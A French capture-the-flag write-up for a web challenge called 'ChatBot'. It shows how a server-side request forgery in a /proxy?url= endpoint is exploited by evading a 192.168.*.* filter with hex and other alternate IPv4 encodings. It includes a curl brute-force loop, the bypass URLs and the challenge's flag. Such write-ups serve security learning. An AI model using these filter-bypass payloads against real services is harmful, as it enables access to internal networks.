# ChatBot

[Lien](https://ctf.challengecybersec.fr/7a144cdc500b28e80cf760d60aca2ed3/challenge-detail.php?chall=31)

Category : Web

Points : 100

## Description

EvilGouv a récemment ouvert un service de chat-bot, vous savez ces trucs que personne n'aime. Bon en plus d'être particulièrement nul, il doit forcément y avoir une faille. Trouvez un moyen d'accéder à l'intranet !

Lien : https://challengecybersec.fr/b34658e7f6221024f8d18a7f0d3497e4

Indice : Réseau local

Le flag est de la forme : DGSESIEE{x} avec x un hash


## Solution

L'analyse du source HTML et de `script.js` montre qu'il y a trois *endpoints* dans l'appli web :
- `/`
- `/bot?message=`
- `/proxy?url=`

Seul `/proxy?url=` a un intérêt: il initie une requête HTTP depuis la machine du CTF, puis cherche les éléments `<title>` et `<link rel="shortcut icon" href="...">` et retourne un document JSON avec le contenu, le titre et le lien vers l'icône. Malheureusement, pas ni header ni faille connue (genre [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)).

On remarque quatre types de comportement:
* retour `Forbidden`
* retour `Not Found`
* retour avec le contenu de la ressource dans un JSON, éventuellement avec le statut HTTP si ce n'est pas 200
* *timeout*

Cependant, sur les adresses de réseau local du type `192.168.x.y` adresses (cf. indice), on constate que le retour `Forbidden` est immédiat. Il y aurait donc un filtrage au niveau de l'adresse ou de la chaîne de caractère. Un petit essai avec `192.168.1.1` et `0xc0a80101` montre le changement de comportement: `Forbidden` vs. *timeout* ! On tient notre piste. Le *endpoint* `/proxy?url=` teste donc que l'adresse n'est pas de la forme `192.168.*.*`.

Un peu d'expérimentation et on s'aperçoit que `0xc0a80001` (`192.168.0.1`) provoque un `Not Found` tandis que `0xc0.0xa8.x.y` avec x ≥ 1 provoque un `timeout`.

Petite boucle d'un **subtil** bruteforce:
```python
#!/usr/bin/env python3
import os
for i in range(1, 255):
    os.system(f"curl https://challengecybersec.fr/b34658e7f6221024f8d18a7f0d3497e4/proxy?url=http://0xC0A800{i:02x}/ &")
```

et on obtient le flag en quelques secondes.

```json
{"contents":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta charset=\"utf-8\">\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  <link href=\"/35e334a1ef338faf064da9eb5f861d3c/fontawesome/css/all.min.css\" rel=\"stylesheet\">\n  <link href=\"/35e334a1ef338faf064da9eb5f861d3c/bootstrap/css/bootstrap.min.css\" rel=\"stylesheet\">\n  <link href=\"/35e334a1ef338faf064da9eb5f861d3c/css/style_index.css\" rel=\"stylesheet\">\n  <link rel=\"icon\" href=\"/35e334a1ef338faf064da9eb5f861d3c/img/favicon.ico\" />\n  <title>Evil Gouv intranet</title>\n</head>\n\n<body>\n  <div>\n    <h1>FLAG DGSESIEE{2cf1655ac88a52d3fe96cb60c371a838}</h1>\n</div>\n</body>\n<script src=\"/35e334a1ef338faf064da9eb5f861d3c/js/jquery-3.5.1.min.js\"></script>\n<script src=\"/35e334a1ef338faf064da9eb5f861d3c/js/popper.min.js\"></script>\n<script src=\"/35e334a1ef338faf064da9eb5f861d3c/js/bootstrap.min.js\"></script>\n\n</html>","title":"Evil Gouv intranet","icon":"Null"}
```

Le résultat s'obtient pour `192.168.0.70`, qui est donc l'adresse de l'intranet:
```bash
curl https://challengecybersec.fr/b34658e7f6221024f8d18a7f0d3497e4/proxy?url=http://0xC0A80046
```

Nota: Il y a une multitude de formats pour l'adresse IPv4 qui fonctionnent: `http://192.168.70`, `http://192.0xA8.0.70`, `http://3232235590`, etc.

## Flag

`DGSESIEE{2cf1655ac88a52d3fe96cb60c371a838}`
